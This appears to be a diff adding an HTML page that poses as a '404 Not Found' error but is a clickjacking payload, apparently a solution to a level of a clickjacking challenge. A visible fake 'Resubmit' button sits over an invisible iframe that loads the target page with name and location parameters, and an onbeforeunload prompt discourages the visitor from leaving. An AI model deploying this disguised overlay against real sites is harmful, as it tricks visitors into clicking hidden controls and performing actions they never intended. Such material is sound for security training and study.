@@ -1,0 +1,21 @@
+<!DOCTYPE HTML> 
+<html>
+	<head>
+		<title>404 Not Found</title>
+		<script>
+			window.onbeforeunload = function() {
+				window.onbeforeunload = null
+				return "Do you really want to leave?"
+			}
+		</script>
+
+	</head>
+	<body>
+		<h1>Not Found</h1>
+		<p>The requested URL was not found on the server
+		</p>
+		<p>Please resubmit your request</p>
+		<div style="position: absolute; left: 238px; top: 300px; background: lightgrey; font-size: 13px; border: 1px solid">Resubmit</div>
+		<iframe src="http://clickjacking-challenges.r7.io/level/2?name=kinders&location=http://r7.io/e/kinders" style="opacity: 0;" height="545" width="600" scrolling="no">
+	</body>
+</html>
